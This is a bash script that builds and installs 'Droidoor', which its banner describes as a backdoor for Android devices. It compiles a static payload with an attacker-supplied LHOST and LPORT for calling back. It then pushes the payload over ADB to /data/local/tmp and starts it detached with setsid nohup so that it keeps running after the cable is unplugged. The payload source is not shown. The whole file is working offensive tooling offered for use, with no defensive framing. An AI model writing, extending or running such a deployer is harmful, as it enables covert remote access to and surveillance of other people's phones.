#!/usr/bin/env bash

set -euo pipefail

# Constants
TARGET_ARCH="aarch64-linux-musl"
OUT_BIN="./bin/droidoor"
CXX="zig c++"

# Colored output
RED="\033[0;31m"
GREEN="\033[0;32m"
BLUE="\033[0;34m"
YELLOW="\033[0;33m"
NC="\033[0m"

info () { echo -e "${BLUE}[ * ]${NC} $1"; }
success () { echo -e "${GREEN}[ + ]${NC} $1"; }
warn () { echo -e "${YELLOW}[ ! ]${NC} $1"; }
error () { echo -e "${RED}[ - ]${NC} $1"; exit 1; }

# -------------- #

check_requirements() {
    local tools=("adb" "zig")
    for tool in "${tools[@]}"; do
        command -v "$tool" >/dev/null 2>&1 || error "Dependency '$tool' not found."
    done
}

check_adb_ready() {
    [ "$(adb get-state 2>/dev/null)" == "device" ]
}

wait_for_device() {
    if ! check_adb_ready; then
        info "Waiting for device... Connect it NOW."
        while ! check_adb_ready; do
            echo -ne "."
            sleep 1
        done
        echo -e "" 
    fi
    success "Device connected!"
}

build_payload() {
    local defines=$1
    info "Compiling payload for $TARGET_ARCH..."
    mkdir -p bin
    
    $CXX -target $TARGET_ARCH -static -O3 \
         src/payload/*.cpp \
         -I. \
         $defines \
         -o $OUT_BIN -lpthread || error "Compilation failed!"
         
    success "Build complete: $OUT_BIN"
}

run_payload_persistently() {
    local remote_path=$1
    info "Executing payload..."
    adb shell "setsid nohup $remote_path > /dev/null 2>&1 &"
    success "Payload is running. You can pull the plug!"
}

show_banner() {
    echo -e "${BLUE}"
    cat << 'EOF'
     _         _    _              
  __| |_ _ ___(_)__| |___  ___ _ _ 
 / _` | '_/ _ \ / _` / _ \/ _ \ '_|
 \__,_|_| \___/_\__,_\___/\___/_|  

Droidoor v1.0.0 -- simple backdoor for android devices, installed using ADB
Project home: <https://github.com/lycan-hunter/droidoor>
EOF
    echo -e "${NC}"
}

main () {
    show_banner
    check_requirements

    echo -e "Select action:"
    echo "1) Build & Deploy (New IP/Port)"
    echo "2) Quick Deploy (Use existing ./bin/droidoor)"
    echo "3) Just Run (If already on device)"
    echo "4) Just Build (No deploy)"
    read -p ">> " action

    local target_dir="/data/local/tmp"
    local default_name="droidoor"

    case "$action" in
        1)
            read -p "Enter LHOST: " USER_IP
            read -p "Enter LPORT: " USER_PORT
            build_payload "-DTARGET_IP=\"$USER_IP\" -DTARGET_PORT=$USER_PORT"
            
            wait_for_device
            read -p "Remote name [$default_name]: " r_name
            local final_name=${r_name:-$default_name}
            local remote_path="$target_dir/$final_name"

            info "Pushing to device..."
            adb push "$OUT_BIN" "$remote_path"
            adb shell "chmod +x $remote_path"
            run_payload_persistently "$remote_path"
            ;;

        2)
            [ ! -f "$OUT_BIN" ] && error "No binary found in ./bin/. Build it first!"
            
            wait_for_device
            read -p "Remote name [$default_name]: " r_name
            local final_name=${r_name:-$default_name}
            local remote_path="$target_dir/$final_name"

            info "Quick pushing..."
            adb push "$OUT_BIN" "$remote_path"
            adb shell "chmod +x $remote_path"
            run_payload_persistently "$remote_path"
            ;;

        3)
            wait_for_device
            read -p "Remote name to run [$default_name]: " r_name
            local final_name=${r_name:-$default_name}
            local remote_path="$target_dir/$final_name"

            if adb shell "[ -f $remote_path ]" 2>/dev/null; then
                run_payload_persistently "$remote_path"
            else
                error "File $remote_path not found on device!"
            fi
            ;;
        4)
            read -p "Enter LHOST: " USER_IP
            read -p "Enter LPORT: " USER_PORT
            build_payload "-DTARGET_IP=\"$USER_IP\" -DTARGET_PORT=$USER_PORT"
            ;;
        *)
            error "Unknown action."
            ;;
    esac
}

main "$@"
